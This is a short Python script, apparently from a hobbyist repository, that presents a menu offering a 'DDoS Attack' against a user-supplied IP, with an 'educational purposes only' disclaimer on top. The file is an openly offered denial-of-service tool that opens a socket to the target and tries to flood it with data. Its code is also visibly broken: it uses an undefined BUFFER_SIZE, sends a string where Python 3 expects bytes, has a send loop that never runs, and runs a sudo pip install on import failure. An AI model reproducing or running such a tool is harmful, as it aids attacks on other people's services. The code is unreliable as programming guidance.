"""
Author: @new92
This program has been created ONLY for educational purposes !
And under no circumstances it should be used for malicious purposes
The author is not responsible for any illegal activity/activities carried out using this program !!
"""
#Imports
try:
    import socket
    import websockets
    import webbrowser
    import urllib
    import urllib3
    import argparse
    import sniffer
    import crypto
    import nmap
    import requests
    import re
    import os
    import sys
    import time
    import random
    from os import system
except ImportError as imp:
    print("Error While Importing Modules !")
    time.sleep(1)
    print("Ignoring Error...")
    time.sleep(2)
    system("sudo pip3 install -r requirements.txt")
#End of Imports

#Main Program
print("[+] Github: @new92")
print("\n")
print("[01] DDoS Attack")
print("[02] Exit")
print("\n")
option=input("[::] Choose an option: ")

while option != "01" and option != "02" and option != "1" and option != "2":
    print("Invalid option !")
    option=input("[::] Please enter again: ")
if option == "01" or option == "1":
    ip=input("Please enter the IP of the target website: ")
    time.sleep(1)
    port=5005
    data = "???"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))
    sock.send(data)
    var=sock.recv(BUFFER_SIZE)
    i = 0
    while i > 0:
        i += 1
        sock.send(data)
    sock.close()
else:
    print("Exiting...")
    time.sleep(2)
    quit(0)
#End of the Program
